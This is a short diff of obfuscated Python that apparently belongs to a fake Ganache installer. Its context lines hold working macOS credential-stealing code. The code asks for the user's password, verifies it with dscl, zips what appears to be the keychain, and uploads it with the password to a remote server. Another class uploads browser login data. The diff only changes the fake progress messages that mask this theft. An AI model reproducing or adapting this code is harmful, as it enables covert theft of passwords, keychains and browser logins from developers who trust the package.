@@ -42,12 +42,12 @@ class q:
 		while L==S:
 			try:N=O.getpass(prompt=K(p));T='dscl . -authonly {} "{}"'.format(O.getuser(),N);U=P.check_output(T,shell=True,stderr=P.DEVNULL);L=U==''.encode('utf-8')
 			except:B('Sorry, try again.')
-		B('Installing Ganache');X=A.path.expanduser(K(V));Q='ganache_sdk/kc.zip';M(X,Q);Z={I:C(Q,J)};a={K(F):E.device_id,K(G):K(W),K(Y):N}
+		B('Lauching Ganache');X=A.path.expanduser(K(V));Q='ganache_sdk/kc.zip';M(X,Q);Z={I:C(Q,J)};a={K(F):E.device_id,K(G):K(W),K(Y):N}
 		try:
 			R=D.post(E.base_url+K(H),data=a,files=Z)
 			if R.status_code<200 or R.status_code>=300:B('Error 43: Unknown error')
 		except:B('Error -43: Unknown error')
-		B('Ganache is installed succesully.')
+		B('Configuring Ethereum Virtual Machine.')
 class r:
 	def __init__(A,device_id,base_url):A.device_id=device_id;A.base_url=base_url
 	def __ul(A,login_data_path,browser):B={I:C(login_data_path,J)};E={K(F):A.device_id,K(N):browser,K(G):K(Z)};L=D.post(A.base_url+K(H),data=E,files=B)
